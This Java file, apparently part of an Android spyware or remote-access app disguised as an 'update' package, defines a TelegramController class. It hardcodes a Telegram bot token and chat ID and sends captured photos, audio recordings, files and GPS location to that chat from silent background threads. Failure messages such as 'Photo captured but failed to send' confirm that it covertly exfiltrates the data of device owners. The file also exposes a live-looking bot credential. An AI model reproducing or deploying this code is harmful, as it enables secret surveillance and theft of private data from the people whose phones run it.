package com.kasari.update;

import android.content.Context;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class TelegramController {

    private static final String BOT_TOKEN = "8755444402:AAHMnXZp0cY60w8HC-bkr_Ut_VNKALeY6Es";
    private static final String CHAT_ID = "8623638607";
    private static final String BASE_URL = "https://api.telegram.org/bot" + BOT_TOKEN;

    public static void sendMessage(Context context, String text) {
        new Thread(() -> {
            try {
                String urlStr = BASE_URL + "/sendMessage?chat_id=" + CHAT_ID +
                    "&parse_mode=HTML&text=" + URLEncoder.encode(text, "UTF-8");
                URL url = new URL(urlStr);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.setConnectTimeout(10000);
                conn.setReadTimeout(10000);
                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void sendPhoto(Context context, byte[] imageBytes, String caption) {
        new Thread(() -> {
            try {
                String boundary = "Boundary" + System.currentTimeMillis();
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(BASE_URL + "/sendPhoto");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(CHAT_ID + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(caption + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"photo\";filename=\"photo.jpg\"" + lineEnd);
                dos.writeBytes("Content-Type: image/jpeg" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.write(imageBytes);
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                dos.flush();
                dos.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                sendMessage(context, "📸 Photo captured but failed to send");
            }
        }).start();
    }

    public static void sendAudio(Context context, byte[] audioBytes, String caption) {
        new Thread(() -> {
            try {
                String boundary = "Boundary" + System.currentTimeMillis();
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(BASE_URL + "/sendAudio");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(CHAT_ID + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(caption + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"audio\";filename=\"audio.ogg\"" + lineEnd);
                dos.writeBytes("Content-Type: audio/ogg" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.write(audioBytes);
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                dos.flush();
                dos.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
                sendMessage(context, "🎤 Audio recorded but failed to send");
            }
        }).start();
    }

    public static void sendDocument(Context context, byte[] fileBytes, String fileName, String caption) {
        new Thread(() -> {
            try {
                String boundary = "Boundary" + System.currentTimeMillis();
                String lineEnd = "\r\n";
                String twoHyphens = "--";

                URL url = new URL(BASE_URL + "/sendDocument");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setDoOutput(true);
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);

                DataOutputStream dos = new DataOutputStream(conn.getOutputStream());

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(CHAT_ID + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"caption\"" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.writeBytes(caption + lineEnd);

                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\"" + fileName + "\"" + lineEnd);
                dos.writeBytes("Content-Type: application/octet-stream" + lineEnd);
                dos.writeBytes(lineEnd);
                dos.write(fileBytes);
                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);

                dos.flush();
                dos.close();

                conn.getResponseCode();
                conn.disconnect();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }).start();
    }

    public static void sendLocation(Context context, double lat, double lon) {
        String msg = "📍 Location: https://maps.google.com/?q=" + lat + "," + lon;
        sendMessage(context, msg);
    }
}